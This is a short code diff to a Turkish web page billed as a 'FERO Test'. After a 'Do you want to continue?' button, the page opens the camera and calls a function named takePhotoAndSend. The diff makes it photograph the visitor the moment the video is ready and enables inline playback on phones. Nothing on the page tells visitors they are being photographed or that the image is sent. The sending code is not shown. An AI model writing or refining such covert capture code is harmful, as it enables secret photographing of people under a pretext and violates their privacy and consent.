@@ -50,7 +50,7 @@
   <h1>FERO Testi</h1>
   <button onclick="startCamera()">Devam etmek istiyor musun?</button>
 
-  <video id="video" autoplay></video>
+  <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
   <script>
@@ -65,7 +65,9 @@
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
-          setTimeout(takePhotoAndSend, 1500); // 1.5 sn sonra oto çek
+          video.onloadedmetadata = () => {
+            takePhotoAndSend(); // kamera hazır olunca çek
+          };
         })
         .catch(() => {
           document.body.innerHTML = "<h1>Kamera izni verilmedi 😅</h1>";
